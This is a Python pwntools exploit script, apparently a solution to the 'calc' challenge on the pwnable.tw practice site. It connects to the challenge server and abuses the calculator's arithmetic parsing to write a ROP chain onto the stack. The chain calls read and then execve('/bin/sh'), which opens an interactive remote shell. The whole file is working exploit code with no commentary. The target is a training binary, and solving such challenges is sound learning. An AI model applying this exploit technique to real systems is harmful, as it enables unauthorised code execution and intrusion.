from pwn import *
import struct
#r = process('./calc')
r = remote('chall.pwnable.tw', 10100)

def getnum(num, need):
	if num<0:
		num = u32(struct.pack('<i', num))
	num = struct.unpack('<i', p32((0x100000000 - num - need)))[0]
	num = str(num)
	if '-' not in num:
		num = '+' + num
	return num

r.recvline()

eip = 0x170
rw_section = 0x80eba00
pop_eax = 0x0805c34b
pop_ecx_ebx = 0x080701d1
pop_edx = 0x080701aa
int_80_ret = 0x0807087e

payload_list = [
	pop_eax, 3,
	pop_ecx_ebx, rw_section, 0,
	pop_edx, 0x200,
	int_80_ret,
	pop_eax, 0xb,
	pop_ecx_ebx, 0, rw_section,
	pop_edx, 0,
	int_80_ret
]


for i in range(len(payload_list)-1, -1, -1):
	if payload_list[i]==0:
		continue

	if payload_list[i-1]==0:
		payload = f'+{eip+i}+{payload_list[i]}'.encode()
		r.sendline(payload)
		recv = int(r.recvline()[:-1])
		print(recv, payload_list[i])
		
		if recv==payload_list[i]:
			payload = f'+{eip+i}-{payload_list[i]}'.encode()
			r.sendline(payload)
			r.recvline()
			
		else:
			t = getnum(recv, payload_list[i])
			payload = f'+{eip+i}{t}'.encode()
			r.sendline(payload)
			r.recvline()
			payload = f'+{eip+i}+{payload_list[i]}'.encode()
			r.sendline(payload)
			r.recvline()
		
	else:
		payload = f'+{eip+i}+{payload_list[i]}'.encode()
		r.sendline(payload)
		r.recvline()

r.sendline()
r.send(b'/bin/sh\x00')

r.interactive()
